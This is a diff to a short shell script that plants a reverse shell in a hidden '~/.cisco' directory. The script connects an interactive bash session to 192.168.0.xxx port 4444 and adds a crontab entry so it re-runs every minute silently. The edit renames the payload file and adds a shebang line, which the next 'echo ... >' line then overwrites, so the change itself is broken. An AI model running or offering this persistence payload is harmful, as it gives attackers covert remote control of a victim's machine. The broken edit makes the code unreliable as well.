@@ -5,14 +5,15 @@ mkdir ~/.cisco
 cd ~/.cisco
 
 #create the reverse shell
-touch shell.cgi
-echo "/bin/bash -i >& /dev/tcp/192.168.0.xxx/4444 0<&1" > shell.cgi
-chmod 777 shell.cgi
+touch shell.sh
+echo "#!/bin/bash" > shell.sh
+echo "/bin/bash -i >& /dev/tcp/192.168.0.xxx/4444 0<&1" > shell.sh
+chmod 777 shell.sh
 
 #add the reverse shell to the user's crontab for regular execution every minute
 touch temp
 crontab -l > temp
-echo "* * * * * $HOME/.cisco/shell.cgi >/dev/null 2>&1" >> temp
+echo "* * * * * $HOME/.cisco/shell.sh >/dev/null 2>&1" >> temp
 crontab temp
 rm temp
 
